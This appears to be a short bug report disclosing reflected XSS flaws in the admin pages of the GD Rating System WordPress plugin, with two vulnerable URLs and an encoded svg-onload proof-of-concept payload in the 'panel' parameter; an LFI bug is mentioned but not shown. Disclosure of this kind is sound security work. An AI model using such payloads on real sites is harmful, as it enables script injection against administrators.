Well ,sir ,I just found some XSS bugs and LFI(Local File Include) bug here.

#### ADLab of Venustech

#### XSS

Here different php files suffer from the bug, exactly, some other files also don't filter well.

```
http://localhost/wordpress/wp-admin/admin.php?page=gd-rating-system-information&panel=x

```

Weak para poc：

```
panel=%27%22%3E%3Csvg%2Fonload%3Dconsole.log(%2Fxss%2F)%3E%3C%27%22

```

##### XSS2

```
http://localhost/wordpress/wp-admin/admin.php?page=gd-rating-system-about&panel=x

```
